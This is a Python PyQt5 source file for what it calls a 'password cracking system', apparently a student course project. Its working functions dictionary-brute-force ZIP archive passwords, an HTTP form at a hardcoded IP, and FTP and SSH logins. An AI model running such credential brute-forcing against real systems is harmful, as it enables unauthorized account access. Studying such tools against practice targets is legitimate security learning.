#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2019/3/5 11:19
# @Author  : ylh
# @FileName: qt_demo1.py
# @Software: PyCharm
import sys
from PyQt5.QtWidgets import QApplication, QMainWindow,QFileDialog
from PyQt5.QtCore import *
from PyQt5 import sip
# from 计网课设 import *
from 口令设计系统 import *
from 计网课设demo import *
import multiprocessing
import zipfile
import itertools as its
from 说明 import *
# from post_eval import *
from post import *
from ftp_ssh import *
class mywindow_ftp_ssh(QMainWindow,Ui_Dialog3):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
    def show_f(self):
        self.show()
class mywindow_post(QMainWindow,Ui_Dialog2):
    mySignal = pyqtSignal(str)
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        # self.post_1= self .textEdit.toPlainText()###事先的空的值
        # self.post_2 = self.plainTextEdit.toPlainText()
    def show_p(self):
        self.show()
    def out_value(self):
        print(self.textEdit.toPlainText())
        print(self.plainTextEdit.toPlainText())
        # return self.textEdit.toPlainText(),self.plainTextEdit.toPlainText()
        self.post_1 = self .textEdit.toPlainText()
        self.post_2 = self.plainTextEdit.toPlainText()
    def sendmessage1(self):
        post_1 = self.textEdit.toPlainText()
        self.mySignal.emit(post_1)
    # def sendmessage2(self):
    #     post_2 = self.plainTextEdit.toPlainText()
    #     self.mySignal.emit(post_2)###发射信号
class mywindow_readme(QMainWindow,Ui_Dialog1):
    def __init__(self):
        super().__init__()
        self.setupUi(self)
        self.dateTimeEdit.setDateTime(QDateTime.currentDateTime())

    def show_m(self):
        self.show()
class MyWindow(QMainWindow,Ui_Dialog):
    def __init__(self, parent=None):
        super(MyWindow, self).__init__(parent)
        self.setupUi(self)
        self.opensay()###调用初始化函数
        self.dic_number =''
        self.string = ''
        self.event = multiprocessing.Event()
        # self.multiprocessing=multiprocessing
    def openpost(self):
        my = mywindow_post(self)
        my.mySignal.connect(self.getdialogsignal)
        my.exec_()
    def getdialogsignal(self,connect):
        self.textEdit.append(connect)
    def opensay(self):
        self.textEdit.append('                  欢迎使用口令破解系统V1.3\n')
    def read(self):
        file_name,ok=QFileDialog.getOpenFileName(self,'读取','./')
        if ok:
            self.textEdit.append('文件来源：'+str(file_name)+'\n')
        self.path = str(file_name) ###路径名
    def ck_1(self):
        self.dic_number= self.dic_number + '1'
        # self.textEdit.append('1')
    def ck_2(self):
        self.dic_number = self.dic_number + '2'
        # self.textEdit.append('2')
    def ck_3(self):
        self.dic_number = self.dic_number + '3'
        # self.textEdit.append('3')
    def ck_4(self):
        self.dic_number = self.dic_number + '4'
        # self.textEdit.append('4')
    def dic_choose_out(self):
        s  = ''
        for i in self.dic_number:
            if i =='1':
                s = s +'1'
            elif i =='2':
                s = s + '2'
            elif i =='3':
                s = s + '3'
            elif i =='4':
                s = '4'
        self.textEdit.append('字典选择：'+s+'    ')
        ss1 = self.spinBox.value()
        self.textEdit.append('爆破最小位数：%s     '%ss1)
        ss2 = self.spinBox_2.value()
        self.textEdit.append('爆破最大位数：%s     '%ss2)
        ss3 = self.spinBox_3.value()
        self.textEdit.append('线程数：%s\n' % ss3)
        for i in s:
            for j in range(int(ss1),int(ss2)+1):
                r = open('./dic/'+str(i)+'_'+str(j)+'.txt').readlines()
                for z in r:
                    self.string=self.string + z
                    # self.textEdit.append(i)
        # a = '0123456789'
        # for j in range(int(self.spinBox.value()), int(self.spinBox_2.value()) + 1):
        #     s = its.product(a,repeat=j)
        #     for i in s:
        #         self.string =self.string + ''.join(i)
        # self.textEdit.append(str(self.string))
        # r= open(r'./dic/1_1.txt').readlines()
        # for i in r:
        #     self.textEdit.append(i)
        # self.textEdit.append(self.string)
    def baopo_say(self):
        self.textEdit.append('开始爆破：\n')
    def zip(self):##,strings
        self.textEdit.append('zip 开始！')
        f = zipfile.ZipFile(str(self.path), 'r')
        self.event.set()
        while self.event.is_set():
        # a = self.string.split()
            for i in self.string.split():
                self.textEdit.append(i+'\n')
                try:
                    f.extractall(pwd=i.encode('utf8'))
                    self.textEdit.append('find pwd: %s\n' % i)
                    self.event.clear()
                    return 0
                except:
                    pass
    def post_crack(self):
        import requests
        self.textEdit.append('youmeiyou')
        s = requests.session()
        url = "http://123.206.87.240:8002/baopo/?yes"
        self.event.set()
        while self.event.is_set():
            try:
                for i in self.string.split():
                    form_data = {'pwd': int(i)}
                    a = s.post(url=url, data=form_data)
                    # print(a.content.decode('utf8'))
                    if len(a.content.decode('utf8')) < 300:
                        self.textEdit.append(str(i)+'\n')
                        self.textEdit.append(str(a.content.decode('utf8')))
                        self.event.clear()
                        return 0
            except:
                pass
    def ftp_crack(self,host,username,password):
        import ftplib
        from ftplib import FTP
        ftp = FTP()
        try:
            ftp.connect(host, 21, 1)
            ftp.login(username, password)
            ftp.retrlines('LIST')
            ftp.quit()
            print('破解成功,用户名：' + username + '，密码：' + password + ',IP:' + host)
            return True
        except ftplib.all_errors:
            pass
    def ssh_crack(self,host,user,pwd):
        import paramiko
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host, username=user, password=pwd, timeout=5)
            ssh.close()
            print('破解成功！用户名：' + user + '，密码：' + pwd + ',主机IP:' + host)
        except:
            pass
    def duojincheng_zip(self):
        self.textEdit.append('多进程开始！')
        d = self.string.split()
        print(d)
        print(self.spinBox_3.value())
        for i in range(int(self.spinBox_3.value())):
            x = d[int(i*len(d)/int(self.spinBox_3.value())):int(i*len(d)/int(self.spinBox_3.value()))+int(len(d)/int(self.spinBox_3.value()))]
            print(x)
            try:
                pr = multiprocessing.Process(target=self.zip,args=())
                pr.start()
            except EOFError:
                pass
            # pr.start()
    # def dianji(self):
    #     # self.textEdit.append(str(self.pushButton_2.clicked))
    #     return True
    # def post_zhixing(self):

if __name__ == '__main__':
    app = QApplication(sys.argv)
    w = MyWindow()##总界面创建
    m = mywindow_readme() ##说明界面创建
    p = mywindow_post()  ##post界面创建
    f = mywindow_ftp_ssh()
    w.show()
    ###字典选择
    w.checkBox.clicked.connect(w.ck_1)
    w.checkBox_2.clicked.connect(w.ck_2)
    w.checkBox_3.clicked.connect(w.ck_3)
    w.checkBox_4.clicked.connect(w.ck_4)

    w.pushButton.clicked.connect(w.read)##读取文件，并输出到日志框

    w.pushButton_2.clicked.connect(w.dic_choose_out)##输出字典选择模式
    w.pushButton_2.clicked.connect(w.baopo_say)##显示开始爆破
    # w.pushButton_2.clicked.connect(w.duojincheng_zip)
    # w.textEdit.append(str(w.pushButton_2.clicked))
    # w.textEdit.append(str(w.pushButton_2.clicked))
    # s = w.pushButton_2.clicked.connect(w.dianji)
    # print(s)
    # if  s:
    #     print('kaishi')
    #     print(w.pushButton_2.clicked)
    # # def duojincheng():
    #     w.textEdit.append('多进程开始！')
    #     d = w.string.split()
    #     for i in range(int(w.spinBox_3.value())):
    #         x = d[int(i * len(d) / int(w.spinBox_3.value())):int(2 * i * len(d) / int(w.spinBox_3.value()))]
    #         try:
    #             pr = multiprocessing.Process(target=w.zip, args=(w,))
    #             pr.start()
    #         except EOFError:
    #             pass

    # w.pushButton_2.clicked.connect(duojincheng())
    # try:
    w.pushButton_2.clicked.connect(w.zip)
    # except:
    #     w.textEdit.append('请选择字典和文件')


    w.pushButton_3.clicked.connect(w.dic_choose_out)
    w.pushButton_3.clicked.connect(w.baopo_say)
    # w.pushButton_3.clicked.connect(w.post_crack)
    w.pushButton_3.clicked.connect(p.show_p)
    # post_1,post_2=\
    p.pushButton.clicked.connect(p.out_value)
    # p.pushButton.clicked.connect(p.sendmessage1)
    # w.openpost()
    # p.pushButton.clicked.connect(w.textEdit.append(str('nihao')))##lambda:p.post_1
    # p.pushButton.clicked.connect(w.textEdit.append(str(p.textEdit.text())))
    # p.pushButton.clicked.connect(w.textEdit.append(str(p.plainTextEdit.text() )))

    w.pushButton_4.clicked.connect(w.dic_choose_out)
    w.pushButton_4.clicked.connect(w.baopo_say)
    w.pushButton_4.clicked.connect(f.show_f)

    w.pushButton_5.clicked.connect(w.dic_choose_out)
    w.pushButton_5.clicked.connect(w.baopo_say)
    w.pushButton_5.clicked.connect(f.show_f)
    w.pushButton_6.clicked.connect(m.show_m)

    # print(w.string)
    sys.exit(app.exec_())

